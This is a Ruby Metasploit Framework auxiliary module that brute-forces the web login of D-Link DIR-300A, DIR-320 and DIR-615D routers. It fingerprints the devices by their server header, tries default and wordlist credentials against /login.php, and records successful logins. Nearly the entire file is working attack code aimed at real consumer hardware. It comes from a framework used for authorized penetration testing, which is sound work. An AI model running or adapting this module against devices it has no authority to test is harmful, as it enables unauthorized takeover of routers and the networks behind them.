##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'D-Link DIR-300A / DIR-320 / DIR-615D HTTP Login Utility',
      'Description' => %q{
          This module attempts to authenticate to different D-Link HTTP management
        services. It has been tested on D-Link DIR-300 Hardware revision A, D-Link DIR-615
        Hardware revision D and D-Link DIR-320 devices. It is possible that this module
        also works with other models.
      },
      'Author'         =>
        [
          'hdm',	#http_login module
          'Michael Messner <devnull[at]s3cur1ty.de>'	#dlink login included
        ],
      'References'     =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('USERNAME',  [ false, "Username for authentication (default: admin)","admin" ]),
        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
      ], self.class)
  end

  def target_url
    proto = "http"
    if rport == 443 or ssl
      proto = "https"
    end
    "#{proto}://#{rhost}:#{rport}#{@uri.to_s}"
  end

  def is_dlink?
    response = send_request_cgi({
      'uri' => @uri,
      'method' => 'GET'
    })

    if response and response.headers['Server'] and response.headers['Server'] =~ /Mathopd\/1\.5p6/
      return true
    else
      return false
    end
  end

  def run_host(ip)

    @uri = "/login.php"

    if is_dlink?
      vprint_good("#{target_url} - D-Link device detected")
    else
      vprint_error("#{target_url} - D-Link device doesn't detected")
      return
    end

    print_status("#{target_url} - Attempting to login")

    each_user_pass { |user, pass|
      do_login(user, pass)
    }
  end

  #default to user=admin without password (default on most dlink routers)
  def do_login(user='admin', pass='')
    vprint_status("#{target_url} - Trying username:'#{user}' with password:'#{pass}'")

    response  = do_http_login(user,pass)
    result = determine_result(response)

    if result == :success
      print_good("#{target_url} - Successful login '#{user}' : '#{pass}'")

      report_auth_info(
        :host   => rhost,
        :port   => rport,
        :sname => (ssl ? 'https' : 'http'),
        :user   => user,
        :pass   => pass,
        :proof  => "WEBAPP=\"D-Link Management Interface\", PROOF=#{response.to_s}",
        :active => true
      )

      return :next_user
    else
      vprint_error("#{target_url} - Failed to login as '#{user}'")
      return
    end
  end

  def do_http_login(user,pass)
    begin
      response = send_request_cgi({
        'uri' => @uri,
        'method' => 'POST',
        'vars_post' => {
          "ACTION_POST" => "LOGIN",
          "LOGIN_USER" => user,
          "LOGIN_PASSWD" => pass,
          "login" => "+Log+In+"
        }
      })
      return nil if response.nil?
      return nil if (response.code == 404)
      return response
    rescue ::Rex::ConnectionError
      vprint_error("#{target_url} - Failed to connect to the web server")
      return nil
    end
  end

  def determine_result(response)
    return :abort if response.nil?
    return :abort unless response.kind_of? Rex::Proto::Http::Response
    return :abort unless response.code
    if response.body =~ /\<META\ HTTP\-EQUIV\=Refresh\ CONTENT\=\'0\;\ url\=index.php\'\>/
      return :success
    end
    return :fail
  end

end
